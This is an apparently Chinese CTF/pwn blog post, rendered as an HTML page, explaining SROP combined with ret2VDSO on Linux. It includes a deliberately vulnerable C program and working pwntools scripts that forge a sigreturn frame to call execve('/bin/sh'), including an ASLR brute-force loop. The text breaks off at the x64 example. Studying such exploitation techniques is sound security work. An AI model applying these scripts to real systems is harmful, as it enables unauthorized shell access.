@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>Use SROP with ret2VDSO | AssassinQ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="ctf，pwn">
+  
+  
+  
+  
+  <meta name="description" content="用 SROP 的时候，一般情况下很难找得到 syscall ; ret，这时就需要在 VDSO 中找了。">
+<meta name="keywords" content="ctf，pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Use SROP with ret2VDSO">
+<meta property="og:url" content="qianfei11.coding.me/2020/03/14/Use-SROP-with-ret2VDSO/index.html">
+<meta property="og:site_name" content="AssassinQ">
+<meta property="og:description" content="用 SROP 的时候，一般情况下很难找得到 syscall ; ret，这时就需要在 VDSO 中找了。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2020-03-15T06:44:41.488Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Use SROP with ret2VDSO">
+<meta name="twitter:description" content="用 SROP 的时候，一般情况下很难找得到 syscall ; ret，这时就需要在 VDSO 中找了。">
+  
+    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css">
+  <link rel="stylesheet" href="/css/fashion.css">
+  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+</html>
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="site-header-image">
+    <img id="originBg" width="100%" alt="Hike News" src>
+  </div>
+
+  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
+    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
+  </div>
+
+  <script>
+        var imgUrls = "css/images/pose01.jpg".split(",");
+        var random = Math.floor((Math.random() * imgUrls.length ));
+        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
+          document.getElementById("originBg").src=imgUrls[random];
+          document.getElementById("blurBg").src=imgUrls[random];
+        } else {
+          document.getElementById("originBg").src='/' + imgUrls[random];
+          document.getElementById("blurBg").src='/' + imgUrls[random];
+        }
+    </script>
+
+
+
+
+<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
+            
+          </h1>
+          
+          
+            <div class="site-description">ZJGSU-IS-17</div>
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Use-SROP-with-ret2VDSO" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      Use SROP with ret2VDSO
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2020/03/14/Use-SROP-with-ret2VDSO/" class="article-date">
+	  <time datetime="2020-03-14T02:24:24.000Z" itemprop="datePublished">March 14, 2020</time>
+	</a>
+
+       
+      
+
+	  |
+	  2.9k words
+	  |
+	  14 minute(s) to read
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>用 SROP 的时候，一般情况下很难找得到 <code>syscall ; ret</code>，这时就需要在 VDSO 中找了。</p>
+<a id="more"></a>
+<h1 id="What-is-VDSO"><a href="#What-is-VDSO" class="headerlink" title="What is VDSO"></a>What is VDSO</h1><p>VDSO（Virtual Dynamically-linked Shared Object）是个很有意思的东西，它是虚拟的，与虚拟内存一样，在计算机中本身并不存在。因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。VDSO 将内核态的调用映射到用户态的地址空间中，可以大量减少这样的开销，同时也可以使路径更好。</p>
+<blockquote>
+<p>这里路径更好指的是，不需要使用传统的 <code>int 0x80</code> 来进行系统调用，不同的处理器实现了不同的快速系统调用指令（Intel 实现了 <code>sysenter</code>、<code>sysexit</code>；AMD 实现了 <code>syscall</code>、<code>sysret</code>），由此自然就会出现兼容性问题。所以 Linux 实现了 <code>vsyscall</code> 接口，在底层会根据具体的结构来进行具体操作。而 <code>vsyscall</code> 就实现在 VDSO 中。</p>
+</blockquote>
+<p>Linux（2.6 及以上的版本）环境下执行 <code>ldd /bin/sh</code>，会发现有个名字叫 <code>linux-vdso.so.1</code>（老点的版本是 <code>linux-gate.so.1</code>）的动态文件，而系统中却找不到它，它就是 VDSO。例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ldd /bin/sh</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffda1746000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a4da29000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f9a4e01b000)</span><br></pre></td></tr></table></figure>
+<p>不光是快速系统调用，glibc 现在也提供了 VDSO 的支持，<code>open()</code>、<code>read()</code>、<code>write()</code>、<code>gettimeofday()</code> 都可以直接用 VDSO 中的实现，使得这些调用更快，glibc 更兼容，内核新特性在不影响 glibc 的情况下也可以更快的部署。</p>
+<h2 id="Why-ret2VDSO"><a href="#Why-ret2VDSO" class="headerlink" title="Why ret2VDSO?"></a>Why ret2VDSO?</h2><p>在 x86 系统中，传统的系统调用 <code>int 0x80</code> 并没有很好的效果，因此在 Intel 新型的 CPU 提供了新的系统调用指令（2.6 及以上的版本支持新型系统调用机制）：</p>
+<ul>
+<li><code>sysenter</code></li>
+<li><code>sysexit</code></li>
+</ul>
+<p>VDSO 可以降低在传统的 <code>int 0x80</code> 的额外开销以及提供了 <code>sigreturn</code> 可以使用 SROP。</p>
+<p>其中 vsyscall 固定地址中存在 <code>syscall ; ret</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/3i 0xffffffffff600000</span><br><span class="line">   0xffffffffff600000:	mov    rax,0x60</span><br><span class="line">   0xffffffffff600007:	syscall</span><br><span class="line">   0xffffffffff600009:	ret</span><br></pre></td></tr></table></figure>
+<p>可以写一个程序做一个系统调用的测试：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">time_t</span> <span class="params">(*time_func)</span><span class="params">(<span class="keyword">time_t</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">time_t</span> tloc;</span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line">    time_func func = (time_func) <span class="number">0xffffffffff600000</span>;</span><br><span class="line"></span><br><span class="line">    retval = func(&amp;tloc);</span><br><span class="line">    <span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"time_func"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%ld\n"</span>, tloc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>总而言之，就是在 VDSO 中存在 <code>syscall ; ret</code> 可以被 SROP 利用。</p>
+<h2 id="How-ret2VDSO"><a href="#How-ret2VDSO" class="headerlink" title="How ret2VDSO?"></a>How ret2VDSO?</h2><p><code>sysenter</code> 其参数传递方式和 <code>int 0x80</code> 是一样的，但是需要先做好 Function Prologue：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push ebp ; mov ebp, esp</span><br></pre></td></tr></table></figure>
+<p>以及需要找到一个好的 Gadget 来做 Stack Pivot。</p>
+<h2 id="ret2VDSO-Theory"><a href="#ret2VDSO-Theory" class="headerlink" title="ret2VDSO Theory"></a>ret2VDSO Theory</h2><p>获取 VDSO 的方法：</p>
+<ol>
+<li>暴力破解</li>
+<li>通过泄漏<ul>
+<li>使用 ld.so 中的 <code>_libc_stack_end</code> 找到 stack 其实位置，计算 ELF Auxiliary Vector Offset 并从中取出 <code>AT_SYSINFO_EHDR</code>；</li>
+<li>使用 ld.so 中的 <code>_rtld_global_ro</code> 的某个 Offset 也有 VDSO 的位置。</li>
+<li>尤其注意的是在开了 ASLR 的情况下，VDSO 的利用是有一定优势的<ul>
+<li>在 x86 环境下：只有一个字节是随机的，所以我们可以很容易暴力解决；</li>
+<li>在 x64 环境下：在开启了 PIE 的情形下，有 11 字节是随机的，例如：CVE-2014-9585。但是在 Linux 3.182.2 版本之后，这个已经增加到了 18 个字节的随机</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>查看存储 VDSO 的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p &amp;_rtld_global_ro._dl_sysinfo_dso</span><br><span class="line">$1 = (const Elf32_Ehdr **) 0xf7ffced4 &lt;_rtld_global_ro+468&gt;</span><br></pre></td></tr></table></figure>
+<p>查看 VDSO 的地址（直接 vmmap 也行）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p _rtld_global_ro._dl_sysinfo_dso</span><br><span class="line">$2 = (const Elf32_Ehdr *) 0xf7fd8000</span><br></pre></td></tr></table></figure>
+<p>通过 ELF Auxiliary Vector Offset 计算出 VDSO 的地址（泄露相应的栈上的值）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; info auxv</span><br><span class="line">32   AT_SYSINFO           Special system info/entry points 0xf7fd8b50</span><br><span class="line">33   AT_SYSINFO_EHDR      System-supplied DSO&apos;s ELF header 0xf7fd8000 &lt;--- Address of VDSO</span><br><span class="line">16   AT_HWCAP             Machine-dependent CPU capability hints 0x9f8bfbff</span><br><span class="line">6    AT_PAGESZ            System page size               4096</span><br><span class="line">17   AT_CLKTCK            Frequency of times()           100</span><br><span class="line">3    AT_PHDR              Program headers for program    0x8048034</span><br><span class="line">4    AT_PHENT             Size of program header entry   32</span><br><span class="line">5    AT_PHNUM             Number of program headers      9</span><br><span class="line">7    AT_BASE              Base address of interpreter    0xf7fd9000</span><br><span class="line">8    AT_FLAGS             Flags                          0x0</span><br><span class="line">9    AT_ENTRY             Entry point of program         0x8048340</span><br><span class="line">11   AT_UID               Real user ID                   0</span><br><span class="line">12   AT_EUID              Effective user ID              0</span><br><span class="line">13   AT_GID               Real group ID                  0</span><br><span class="line">14   AT_EGID              Effective group ID             0</span><br><span class="line">23   AT_SECURE            Boolean, was exec setuid-like? 0</span><br><span class="line">25   AT_RANDOM            Address of 16 random bytes     0xffffd8cb</span><br><span class="line">31   AT_EXECFN            File name of executable        0xffffdfd8 &quot;/root/tmp/ret2VDSO_Example/main&quot;</span><br><span class="line">15   AT_PLATFORM          String identifying platform    0xffffd8db &quot;i686&quot;</span><br><span class="line">0    AT_NULL              End of vector                  0x0</span><br></pre></td></tr></table></figure>
+<p>事实证明 VDSO 也没有非常随机，可以做一个测试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ ldd /bin/ls</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ffff7bb5000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77eb000)</span><br><span class="line">	libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007ffff757b000)</span><br><span class="line">	libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7377000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)</span><br><span class="line">	libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ffff715a000)</span><br><span class="line"></span><br><span class="line">$ <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> ldd /bin/ls; <span class="keyword">done</span> | grep 0x00007ffff7ffa000</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>32 位下对 VDSO 进行爆破。程序如下，读入 0x400 的字节，足够塞一个构造的 sigcontext 了：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">10</span>] = <span class="string">"/bin/sh\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwnme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">char</span> *welcome = <span class="string">"&gt; "</span>;</span><br><span class="line">    write(<span class="number">1</span>, welcome, <span class="number">2</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x400</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	pwnme();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同时，我们在 VDSO 中可以找到 sigreturn 所对应的调用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/3i 0xf7fd8b71</span><br><span class="line">   0xf7fd8b71 &lt;__kernel_sigreturn+1&gt;:	mov    eax,0x77</span><br><span class="line">   0xf7fd8b76 &lt;__kernel_sigreturn+6&gt;:	int    0x80</span><br><span class="line">   0xf7fd8b78 &lt;__kernel_sigreturn+8&gt;:	nop</span><br></pre></td></tr></table></figure>
+<p>关闭 ASLR 对 ret2VDSO 进行测试：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'lxterminal'</span>, <span class="string">'-e'</span>]</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x804a020</span></span><br><span class="line">bss_addr = <span class="number">0x804a030</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">vdso_addr = <span class="number">0xf7fd8000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Try vdso %s'</span> % hex(vdso_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x110</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">"i386"</span>)</span><br><span class="line">frame.eax = constants.SYS_execve</span><br><span class="line">frame.ebx = bin_sh_addr</span><br><span class="line">frame.eip = vdso_addr + <span class="number">0xb76</span> <span class="comment"># address of int 0x80</span></span><br><span class="line">frame.esp = bss_addr</span><br><span class="line">frame.ebp = bss_addr</span><br><span class="line">frame.gs = <span class="number">0x63</span></span><br><span class="line">frame.cs = <span class="number">0x23</span></span><br><span class="line">frame.es = <span class="number">0x2b</span></span><br><span class="line">frame.ds = <span class="number">0x2b</span></span><br><span class="line">frame.ss = <span class="number">0x2b</span></span><br><span class="line">ret_addr = vdso_addr + <span class="number">0xb71</span> <span class="comment"># address of sigreturn</span></span><br><span class="line">payload += p32(ret_addr) + str(frame)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'echo pwned'</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">'pwned'</span>)</span><br><span class="line"><span class="keyword">if</span> data != <span class="string">'pwned'</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception, <span class="string">'Failed'</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>打开 ASLR 之后对 VDSO 进行爆破（32 位是 $\frac{1}{256}$ 的概率）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x804a020</span></span><br><span class="line">bss_addr = <span class="number">0x804a030</span></span><br><span class="line">vdso_range = range(<span class="number">0xf7600000</span>, <span class="number">0xf7700000</span>, <span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    context.arch = <span class="string">'i386'</span></span><br><span class="line">    p = process(<span class="string">'./main'</span>)</span><br><span class="line">    <span class="keyword">global</span> vdso_addr</span><br><span class="line">    vdso_addr = random.choice(vdso_range)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Try vdso %s'</span> % hex(vdso_addr)</span><br><span class="line">    payload = <span class="string">'A'</span> * <span class="number">0x110</span></span><br><span class="line">    frame = SigreturnFrame(kernel=<span class="string">"i386"</span>)</span><br><span class="line">    frame.eax = constants.SYS_execve</span><br><span class="line">    frame.ebx = bin_sh_addr</span><br><span class="line">    frame.eip = vdso_addr + <span class="number">0xb76</span> <span class="comment"># address of int 0x80</span></span><br><span class="line">    frame.esp = bss_addr</span><br><span class="line">    frame.ebp = bss_addr</span><br><span class="line">    frame.gs = <span class="number">0x63</span></span><br><span class="line">    frame.cs = <span class="number">0x23</span></span><br><span class="line">    frame.es = <span class="number">0x2b</span></span><br><span class="line">    frame.ds = <span class="number">0x2b</span></span><br><span class="line">    frame.ss = <span class="number">0x2b</span></span><br><span class="line">    ret_addr = vdso_addr + <span class="number">0xb71</span> <span class="comment"># address of sigreturn</span></span><br><span class="line">    payload += p32(ret_addr) + str(frame)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendline(<span class="string">'echo pwned'</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'pwned'</span>)</span><br><span class="line">    <span class="keyword">if</span> data != <span class="string">'pwned'</span>:</span><br><span class="line">        info(<span class="string">'Failed'</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">global</span> p, vdso_addr</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Try %d'</span> % i</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            bruteforce()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            info(<span class="string">'Wrong VDSO'</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        info(<span class="string">'vdso_addr = '</span> + hex(vdso_addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="Example-x64"><a href="#Example-x64" class="headerlink" title="Example_x64"></a>Example_x64</h1><p>64 位下使用 AXUV 泄漏 VDSO 的例子。主要是输入一串长为 1024 的字符串：</p>
